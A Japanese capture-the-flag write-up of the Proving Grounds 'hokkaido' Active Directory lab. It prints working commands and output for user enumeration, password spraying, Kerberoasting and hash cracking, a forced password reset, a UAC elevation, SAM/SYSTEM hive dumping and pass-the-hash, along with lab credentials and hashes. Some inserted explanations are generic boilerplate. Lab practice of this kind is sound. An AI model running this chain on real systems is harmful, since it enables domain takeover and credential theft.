---
title: "Proving Grounds - hokkaido (Windows)"
date: 2026-03-24
description: "Proving Grounds hokkaido Windows マシン解説。Kerberoasting、パスワードスプレー、ForceChangePassword による横移動、UAC バイパス、SeBackupPrivilege 悪用を解説。"
categories: [Proving Grounds, Windows]
tags: [active-directory, kerberoast, password-spray, mssql, bloodyad, force-change-password, sebackup-privilege, uac-bypass, pass-the-hash]
mermaid: true
content_lang: ja
alt_en: /posts/pg-hokkaido/
---

## 概要

| 項目 | 内容 |
|---------------------------|-------|
| OS | Windows Server 2022 |
| 難易度 | 記録なし |
| 攻撃対象 | Active Directory (Kerberos, MSSQL, SMB, RDP) |
| 主な侵入経路 | パスワードスプレー (info:info)、Kerberoasting で Hazel.Green クラック、ForceChangePassword で Molly.Smith |
| 権限昇格経路 | UAC バイパス (RunAs) + SeBackupPrivilege で SAM/SYSTEM ダンプ、Pass-the-Hash で Administrator |

## 認証情報

```text
info:info
Hazel.Green haze1988
Molly.Smith Welc0me2024
Administrator NTHash: d752482897d54e239376fddb2a2109e4
```

## 偵察

---
💡 なぜ有効か
This stage maps the reachable attack surface and identifies where exploitation is most likely to succeed. Accurate service and content discovery reduces blind testing and drives targeted follow-up actions.

```bash
rustscan -a $ip -r 1-65535 --ulimit 5000
```

```bash
Open 192.168.198.40:53
Open 192.168.198.40:80
Open 192.168.198.40:88
Open 192.168.198.40:135
Open 192.168.198.40:139
Open 192.168.198.40:389
Open 192.168.198.40:445
Open 192.168.198.40:464
Open 192.168.198.40:593
Open 192.168.198.40:636
Open 192.168.198.40:1433
Open 192.168.198.40:3268
Open 192.168.198.40:3269
Open 192.168.198.40:5985
Open 192.168.198.40:8530
Open 192.168.198.40:8531
Open 192.168.198.40:9389
```

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com)
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8530/tcp  open  http          Microsoft IIS httpd 10.0
9389/tcp  open  mc-nmf        .NET Message Framing
```

SMB、LDAP、RPC への匿名アクセスはすべて拒否された。kerbrute によるユーザー列挙で有効なアカウントを発見:

```bash
kerbrute userenum --dc $ip -d hokkaido-aerospace.com /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
```

```bash
[+] VALID USERNAME:  info@hokkaido-aerospace.com
[+] VALID USERNAME:  administrator@hokkaido-aerospace.com
[+] VALID USERNAME:  discovery@hokkaido-aerospace.com
```

## 初期侵入

---
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

ユーザー名をパスワードとしたスプレーで `info:info` が SMB と MSSQL の両方で有効:

```bash
netexec mssql $ip -u user.txt -p user.txt -d hokkaido-aerospace.com --no-bruteforce
```

```bash
MSSQL       192.168.198.40  1433   DC               [+] hokkaido-aerospace.com\info:info
```

MSSQL アクセスは guest レベル (sysadmin なし) だが、`info` アカウントで Kerberoasting が可能:

```bash
impacket-GetUserSPNs hokkaido-aerospace.com/info:info -dc-ip $ip -request
```

```bash
ServicePrincipalName                   Name         MemberOf                                                      PasswordLastSet             LastLogon
-------------------------------------  -----------  ------------------------------------------------------------  --------------------------  --------------------------
discover/dc.hokkaido-aerospace.com     discovery    CN=services,CN=Users,DC=hokkaido-aerospace,DC=com             2023-12-07 00:42:56.221832  2026-03-17 03:05:32.909076
http/fake.hokkaido-aerospace.com       Hazel.Green  CN=Tier2-Admins,OU=admins,OU=it,DC=hokkaido-aerospace,DC=com  2023-12-07 01:34:46.565497  2026-03-17 03:09:36.268444
maintenance/dc.hokkaido-aerospace.com  maintenance  CN=services,CN=Users,DC=hokkaido-aerospace,DC=com             2023-11-25 22:39:04.869703  <never>
```

hashcat で Hazel.Green の TGS-REP ハッシュをクラック:

```bash
hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force
```

```bash
$krb5tgs$23$*Hazel.Green$HOKKAIDO-AEROSPACE.COM$...:haze1988
```

Hazel.Green は Tier2-Admins のメンバーだった。bloodyAD で Molly.Smith に対する ForceChangePassword 権限を発見:

```bash
bloodyAD -d hokkaido-aerospace.com -u 'Hazel.Green' -p 'haze1988' \
  --host 192.168.198.40 get writable --right 'WRITE' --detail
```

```bash
distinguishedName: CN=Molly Smith,OU=Tier1,OU=admins,OU=it,DC=hokkaido-aerospace,DC=com
pwdLastSet: WRITE
```

Molly.Smith のパスワードをリセット:

```bash
bloodyAD -d hokkaido-aerospace.com -u 'Hazel.Green' -p 'haze1988' \
  --host 192.168.198.40 set password 'Molly.Smith' 'Welc0me2024'
```

```bash
[+] Password changed successfully!
```

Molly.Smith は RDP アクセス可能 (Remote Desktop Users + Server Operators):

```bash
nxc rdp $ip -u Molly.Smith -p 'Welc0me2024' --continue-on-success
```

```bash
RDP         192.168.198.40  3389   DC               [+] hokkaido-aerospace.com\Molly.Smith:Welc0me2024 (Pwn3d!)
```

```bash
xfreerdp3 +clipboard /drive:share,/home/n0z0/share /v:$ip /u:Molly.Smith /p:Welc0me2024
```

```bash
local.txt: cf5586a752603d7d7b4987e35fce23f5
```

💡 なぜ有効か
The initial access step chains discovered weaknesses into executable control over the target. Successful foothold techniques are validated by command execution or interactive shell callbacks.

## 権限昇格

---
Molly.Smith は Server Operators のメンバーだが、UAC によりトークンが Medium Integrity Level にフィルタされ、グループが "deny only" になっていた。UAC バイパスが必要:

```powershell
powershell Start-Process cmd -Verb RunAs
```

昇格後、`SeBackupPrivilege` がトークン内に表示された (Disabled だが存在 — `reg.exe` は内部で `AdjustTokenPrivileges()` により有効化する):

```powershell
whoami /priv
```

```bash
Privilege Name                Description                         State
============================= =================================== ========
SeMachineAccountPrivilege     Add workstations to domain          Disabled
SeBackupPrivilege             Back up files and directories       Disabled
SeRestorePrivilege            Restore files and directories       Disabled
SeShutdownPrivilege           Shut down the system                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
```

Server Operators グループが完全に有効化:

```powershell
whoami /groups | findstr /i "server"
```

```bash
BUILTIN\Server Operators  Alias  S-1-5-32-549  Mandatory group, Enabled by default, Enabled group
```

SeBackupPrivilege を使用して SAM と SYSTEM レジストリハイブをダンプ:

```powershell
reg save HKLM\SAM C:\Users\Molly.Smith\sam.bak
reg save HKLM\SYSTEM C:\Users\Molly.Smith\system.bak
```

```bash
The operation completed successfully.
```

オフラインでローカル管理者ハッシュを抽出:

```bash
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d752482897d54e239376fddb2a2109e4:::
```

Pass-the-Hash で evil-winrm から Administrator アクセス:

```bash
evil-winrm -i $ip -u administrator -H d752482897d54e239376fddb2a2109e4
```

```bash
*Evil-WinRM* PS C:\Users\Administrator\desktop> type proof.txt
d796d05a41bc2fed96a944888776ea95
```

💡 なぜ有効か
Privilege escalation relies on local misconfigurations, unsafe permissions, and trusted execution paths. Enumerating and abusing these trust boundaries is the fastest route to root-level access.

## まとめ・学んだこと

- ユーザー名と同じパスワードのアカウントを排除する — `info:info` のパスワードスプレーで初期ドメインアクセスが可能になった。
- Kerberoastable なサービスアカウントには強力なパスワード (25文字以上) を設定する — 弱いパスワードは rockyou.txt で即座にクラックされる。
- Tier 間の ForceChangePassword/pwdLastSet WRITE 権限を監査する — Tier2 が Tier1 のパスワードをリセットできるべきではない。
- Server Operators メンバーシップ + RDP アクセスは UAC バイパスで High Integrity に昇格でき、SeBackupPrivilege が利用可能になる。
- SeBackupPrivilege (Disabled でも) は SAM/SYSTEM レジストリダンプを許可する — `reg save HKLM\SAM` イベントを監視する。
- LAPS やユニークなローカル管理者パスワードを使用して、SAM 抽出後の Pass-the-Hash を防止する。

### Attack Flow

---
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```mermaid
flowchart LR
    subgraph SCAN["🔍 スキャン"]
        direction TB
        S1["Rustscan / Nmap\nPORT: 53/80/88/135/389/445\n1433/3389/5985/8530"]
        S2["kerbrute userenum\ninfo / discovery / administrator"]
        S3["SMB / RPC / LDAP\n匿名アクセス全拒否"]
        S1 --> S2 --> S3
    end

    subgraph INITIAL["💥 初期侵入"]
        direction TB
        I1["Password Spray\ninfo:info SMB + MSSQL 認証成功"]
        I2["Kerberoasting\nGetUserSPNs 3x TGS-REP 取得"]
        I3["hashcat -m 13100\nHazel.Green:haze1988"]
        I1 --> I2 --> I3
    end

    subgraph LATERAL["🔄 横移動"]
        direction TB
        L1["bloodyAD get writable\nMolly.Smith pwdLastSet: WRITE"]
        L2["ForceChangePassword\nMolly.Smith → Welc0me2024"]
        L3["xfreerdp3 RDP接続\nlocal.txt 取得"]
        L1 --> L2 --> L3
    end

    subgraph PRIVESC["⬆️ 権限昇格"]
        direction TB
        P1["RunAs 管理者\nUAC 昇格 → High IL トークン"]
        P2["SeBackupPrivilege\nreg save SAM + SYSTEM"]
        P3["secretsdump LOCAL\nAdministrator NTHash 取得"]
        P4["evil-winrm PtH\nproof.txt 取得"]
        P1 --> P2 --> P3 --> P4
    end

    SCAN --> INITIAL --> LATERAL --> PRIVESC

    style SCAN fill:#e8eaf6
    style INITIAL fill:#c8e6c9
    style LATERAL fill:#e1f5fe
    style PRIVESC fill:#fff9c4
    style L3 fill:#ff9800
    style P4 fill:#4caf50
```

## 参考リンク

- Kerbrute: https://github.com/ropnop/kerbrute
- Impacket (GetUserSPNs, secretsdump): https://github.com/fortra/impacket
- bloodyAD: https://github.com/CravateRouge/bloodyAD
- Evil-WinRM: https://github.com/Hackplayers/evil-winrm
- Hashcat: https://hashcat.net/hashcat/
- SeBackupPrivilege Abuse: https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/
- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
